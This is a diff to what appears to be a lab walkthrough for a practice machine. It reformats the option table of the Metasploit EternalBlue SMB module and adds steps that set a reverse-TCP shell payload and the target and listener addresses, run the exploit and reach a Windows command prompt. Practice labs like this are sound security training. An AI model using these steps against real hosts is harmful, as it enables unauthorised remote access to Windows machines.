@@ -109,19 +109,34 @@ After selecting the exploit we can show the module options with the command `sho
 
     Module options (exploit/windows/smb/ms17_010_eternalblue):
 
-        Name           Current Setting  Required  Description
-        ----           ---------------  --------  -----------
-        RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
-        RPORT          445              yes       The target port (TCP)
-        SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Stand
-                                                    ard 7 target machines.
-        SMBPass                         no        (Optional) The password for the specified username
-        SMBUser                         no        (Optional) The username to authenticate as
-        VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard
-                                                    7 target machines.
-        VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m
-                                                    achines.
+    Name           Current Setting  Required  Description
+    ----           ---------------  --------  -----------
+    RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+    RPORT          445              yes       The target port (TCP)
+    SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+    SMBPass                         no        (Optional) The password for the specified username
+    SMBUser                         no        (Optional) The username to authenticate as
+    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
 
 ==- Reveal Answer
 RHOSTS
 ===
+
+Before we run the exploit, we first select a payload and some options. To find your IP address run the `ifconfig` command and look for the `tun0` interface.
+
+`set payload windows/x64/shell/reverse_tcp`
+
+`set RHOSTS <SERVER IP ADDRESS>`
+
+`set LHOST <YOUR IP ADDRESS>`
+
+With that done, run the exploit. You can run the exploit with either the `run` or `exploit` command.
+
+![Exploit is running](/static/images/exploit-blue.png)
+
+!!!
+The exploit is running successfully if you see the Windows shell: `C:\Windows\system32>`.
+!!!
+
+### Escalate
